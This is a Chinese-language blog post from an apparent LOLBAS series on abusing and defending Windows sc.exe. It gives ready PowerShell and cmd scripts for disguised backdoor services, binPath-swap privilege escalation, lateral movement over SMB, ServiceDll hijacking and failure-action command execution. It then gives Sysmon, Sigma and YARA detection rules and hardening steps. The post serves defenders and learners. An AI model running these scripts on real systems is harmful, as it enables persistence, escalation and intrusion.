---
title: "【LOLBAS鐵人賽Day15】Sc.exe：Windows服務控制管理器的攻防技術"
published: 2025-09-29T15:54:04.000Z
description: "LOLBAS 系列第 15 天"
tags: [LOLBAS, Windows, Security]
category: Research
draft: false
---

在 Windows 系統管理中，服務（Services）是系統核心功能的重要組成部分  
sc.exe（Service Control）是 Windows 內建的服務控制管理器命令列工具，提供了強大的服務管理功能但這個合法的系統工具也經常被攻擊者濫用來進行持續性攻擊權限提升和橫向移動  
今天我們來一起看看 sc.exe 的各種使用技術，以及如何檢測和防禦相關的惡意行為

## sc.exe 簡介

### 基本資訊

*   **檔案位置**：`C:\Windows\System32\sc.exe`
*   **功能用途**：與服務控制管理器和服務進行通訊
*   **權限要求**：根據操作不同，需要不同等級的權限
*   **簽署狀態**：由 Microsoft 數位簽署

### 合法用途

sc.exe 的正常管理功能包括：

*   查詢服務狀態
*   啟動停止暫停服務
*   創建刪除服務
*   修改服務配置
*   管理遠端電腦的服務

## 基本使用方法

### 查詢服務

```cmd
sc query
sc query type= service
sc query state= all
sc queryex servicename

```

### 創建服務

```cmd
sc create MyService binPath= "C:\Path\To\Service.exe"
sc create MyService binPath= "C:\Path\To\Service.exe" start= auto
sc create MyService binPath= "cmd.exe /k C:\evil.exe" type= own type= interact

```

### 修改服務

```cmd
sc config MyService start= auto
sc config MyService binPath= "C:\NewPath\NewService.exe"
sc config MyService obj= ".\LocalSystem" password= ""

```

### 啟動與停止服務

```cmd
sc start MyService
sc stop MyService
sc pause MyService
sc continue MyService

```

### 刪除服務

```cmd
sc delete MyService

```

## 惡意使用技術

### 技術 1：創建持續性後門服務

攻擊者可以創建惡意服務來維持持續性存取

#### PowerShell 實作

```powershell
function Create-BackdoorService {
    param(
        [string]$ServiceName = "WindowsUpdate",
        [string]$BinaryPath = "C:\Windows\Temp\backdoor.exe",
        [string]$DisplayName = "Windows Update Service"
    )
    
    $result = sc.exe create $ServiceName binPath= $BinaryPath DisplayName= $DisplayName start= auto
    if ($LASTEXITCODE -eq 0) {
        sc.exe description $ServiceName "Provides Windows Update functionality"
        sc.exe start $ServiceName
        return $true
    }
    return $false
}

```

#### 執行說明

**服務名稱偽裝**

*   使用類似系統服務的名稱（如 WindowsUpdate）來避免懷疑
*   設定合理的顯示名稱和描述

**自動啟動設定**

*   `start= auto` 確保系統重啟後服務自動執行
*   提供持續的後門存取

**權限配置**

*   預設以 LocalSystem 權限執行
*   獲得最高系統權限

### 技術 2：濫用服務進行權限提升

透過修改現有服務的二進位路徑來執行惡意程式碼

#### PowerShell 實作

```powershell
function Exploit-ServicePermission {
    param(
        [string]$TargetService,
        [string]$PayloadPath
    )
    
    $originalPath = (sc.exe qc $TargetService | Select-String "BINARY_PATH_NAME").ToString().Split(":")[1].Trim()
    
    sc.exe config $TargetService binPath= $PayloadPath
    sc.exe stop $TargetService
    Start-Sleep -Seconds 2
    sc.exe start $TargetService
    
    Start-Sleep -Seconds 5
    sc.exe config $TargetService binPath= $originalPath
}

```

#### 關鍵技術點

**服務權限檢查**

*   尋找可修改的服務
*   檢查 ACL 權限設定

**路徑劫持**

*   暫時修改服務執行路徑
*   執行後還原以避免檢測

**時機控制**

*   在維護窗口或低活動期間執行
*   快速執行並清理痕跡

### 技術 3：使用服務進行橫向移動

透過 sc.exe 在遠端系統創建和執行服務

#### PowerShell 實作

```powershell
function Invoke-RemoteService {
    param(
        [string]$TargetHost,
        [string]$ServiceName = "TempService",
        [string]$Command
    )
    
    $remotePath = "\\$TargetHost\C$\Windows\Temp\payload.exe"
    Copy-Item "C:\local\payload.exe" -Destination $remotePath -Force
    
    sc.exe \\$TargetHost create $ServiceName binPath= "C:\Windows\Temp\payload.exe"
    sc.exe \\$TargetHost start $ServiceName
    
    Start-Sleep -Seconds 10
    
    sc.exe \\$TargetHost stop $ServiceName
    sc.exe \\$TargetHost delete $ServiceName
    Remove-Item $remotePath -Force
}

```

#### 實作要點

**遠端連接**

*   使用 `\\computername` 語法連接遠端系統
*   需要適當的網路存取權限

**檔案傳輸**

*   先複製執行檔到目標系統
*   使用 SMB 共享進行傳輸

**清理作業**

*   執行後刪除服務
*   移除遠端檔案

### 技術 4：服務 DLL 劫持

創建服務載入惡意 DLL

#### C++ DLL 範例

```cpp
#include <windows.h>
#include <stdio.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        system("cmd.exe /c echo Hijacked > C:\\temp\\proof.txt");
        break;
    }
    return TRUE;
}

extern "C" __declspec(dllexport) VOID ServiceMain(DWORD dwArgc, LPTSTR *lpszArgv) {
    // Service main function
}

```

#### 服務創建

```cmd
sc create MaliciousService binPath= "C:\Windows\System32\svchost.exe -k MyGroup"
reg add "HKLM\SYSTEM\CurrentControlSet\Services\MaliciousService\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "C:\evil.dll"

```

### 技術 5：利用服務失敗動作

配置服務失敗時執行特定命令

```cmd
sc failure MyService reset= 0 actions= restart/0/restart/0/run/1000 command= "C:\Windows\System32\cmd.exe /c C:\evil.bat"

```

#### PowerShell 自動化

```powershell
function Set-ServiceFailureAction {
    param(
        [string]$ServiceName,
        [string]$Command
    )
    
    $actions = "restart/60000/restart/60000/run/60000"
    sc.exe failure $ServiceName reset= 86400 actions= $actions command= $Command
    
    sc.exe stop $ServiceName
}

```

## 檢測方法

### Windows Event Log 監控

需要監控的事件 ID：

| Event ID | 描述 | 日誌 |
|---|---|---|
| 7045 | 新服務已安裝 | System |
| 7040 | 服務啟動類型已變更 | System |
| 7036 | 服務已進入執行/停止狀態 | System |
| 4697 | 系統中已安裝服務 | Security |

### Sysmon 設定

```xml
<Sysmon schemaversion="4.22">
  <EventFiltering>
    <RuleGroup name="Service Creation Detection">
      <ProcessCreate onmatch="include">
        <Image condition="end with">sc.exe</Image>
        <CommandLine condition="contains any">create;config;failure</CommandLine>
      </ProcessCreate>
      
      <RegistryEvent onmatch="include">
        <TargetObject condition="contains">\Services\</TargetObject>
        <EventType condition="is">SetValue</EventType>
      </RegistryEvent>
    </RuleGroup>
  </EventFiltering>
</Sysmon>

```

### PowerShell 監控腳本

```powershell
function Monitor-ServiceChanges {
    $baseline = Get-Service | Select-Object Name, DisplayName, Status, StartType
    
    while ($true) {
        Start-Sleep -Seconds 30
        $current = Get-Service | Select-Object Name, DisplayName, Status, StartType
        
        $diff = Compare-Object $baseline $current -Property Name, DisplayName, StartType
        
        if ($diff) {
            foreach ($change in $diff) {
                if ($change.SideIndicator -eq "=>") {
                    Write-Warning "New or modified service detected: $($change.Name)"
                    
                    $evt = Get-WinEvent -FilterHashtable @{LogName='System'; ID=7045} -MaxEvents 1
                    if ($evt) {
                        Write-Warning "Service details: $($evt.Message)"
                    }
                }
            }
            $baseline = $current
        }
    }
}

```

### Sigma 規則

```yaml
title: Suspicious Service Creation via SC.exe
id: 85b794f7-8d8c-4cbd-a22e-5d3c9c4e3a6d
status: experimental
description: Detects suspicious service creation using sc.exe
references:
  - https://lolbas-project.github.io/
tags:
  - attack.persistence
  - attack.t1543.003
  - attack.privilege_escalation
logsource:
  category: process_creation
  product: windows
detection:
  selection_img:
    Image|endswith: '\sc.exe'
  selection_cli:
    CommandLine|contains|all:
      - 'create'
      - 'binPath'
  suspicious_paths:
    CommandLine|contains:
      - '\Users\Public\'
      - '\Temp\'
      - '\AppData\'
      - 'cmd.exe'
      - 'powershell'
      - 'regsvr32'
      - 'rundll32'
  condition: selection_img and selection_cli and suspicious_paths
falsepositives:
  - Legitimate software installation
  - System administration activities
level: medium

```

### YARA 規則

```yara
rule Suspicious_Service_Creation {
    meta:
        description = "Detects suspicious service creation patterns"
        author = "Security Team"
        date = "2024-11-15"
        
    strings:
        $sc1 = "sc create" nocase
        $sc2 = "sc config" nocase
        $sc3 = "binPath=" nocase
        
        $susp1 = "cmd.exe /c" nocase
        $susp2 = "powershell.exe" nocase
        $susp3 = "%COMSPEC%" nocase
        $susp4 = "regsvr32" nocase
        
        $path1 = "\\Temp\\" nocase
        $path2 = "\\Users\\Public\\" nocase
        $path3 = "\\AppData\\" nocase
        
    condition:
        any of ($sc*) and any of ($susp*) and any of ($path*)
}

```

## 防禦措施

### 1\. 服務權限強化

```powershell
function Harden-ServicePermissions {
    param([string]$ServiceName)
    
    $sdl = "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)"
    sc.exe sdset $ServiceName $sdl
}

```

### 2\. 審核策略設定

```powershell
auditpol /set /subcategory:"Security System Extension" /success:enable /failure:enable
auditpol /set /subcategory:"System Integrity" /success:enable /failure:enable

```

### 3\. AppLocker 規則

```xml
<AppLockerPolicy Version="1">
  <RuleCollection Type="Exe">
    <FilePublisherRule Id="1" Name="Block Unsigned Services" Action="Deny">
      <Conditions>
        <FilePublisherCondition PublisherName="*" BinaryName="*" />
      </Conditions>
      <Exceptions>
        <FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION" />
      </Exceptions>
    </FilePublisherRule>
  </RuleCollection>
</AppLockerPolicy>

```

### 4\. 監控服務基準線

```powershell
function Create-ServiceBaseline {
    $baseline = @()
    
    Get-Service | ForEach-Object {
        $service = $_
        $wmi = Get-WmiObject Win32_Service -Filter "Name='$($service.Name)'"
        
        $baseline += [PSCustomObject]@{
            Name = $service.Name
            DisplayName = $service.DisplayName
            Status = $service.Status
            StartType = $service.StartType
            PathName = $wmi.PathName
            StartName = $wmi.StartName
            Description = $wmi.Description
            Hash = (Get-FileHash $wmi.PathName -ErrorAction SilentlyContinue).Hash
        }
    }
    
    $baseline | Export-Csv -Path "C:\ServiceBaseline.csv" -NoTypeInformation
}

```

## 總結

sc.exe 作為 Windows 內建的服務管理工具，提供了強大的功能，但也成為攻擊者常用的工具主要威脅包括：

1.  **持續性機制**：創建惡意服務維持長期控制
2.  **權限提升**：利用服務配置弱點提升權限
3.  **橫向移動**：透過遠端服務部署進行擴散
4.  **隱蔽執行**：偽裝成合法服務避免檢測

### 關鍵指標

*   監控 Event ID 70454697
*   檢查服務二進位路徑的異常
*   注意從臨時目錄執行的服務
*   警惕使用 cmd.exe 或 PowerShell 的服務

## 參考資源

*   [Microsoft SC Documentation](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc)
*   [MITRE ATT&CK - T1543.003](https://attack.mitre.org/techniques/T1543/003/)
*   [LOLBAS - sc.exe](https://lolbas-project.github.io/lolbas/Binaries/Sc/)
*   [Windows Service Security](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/system-services-security-policy-settings)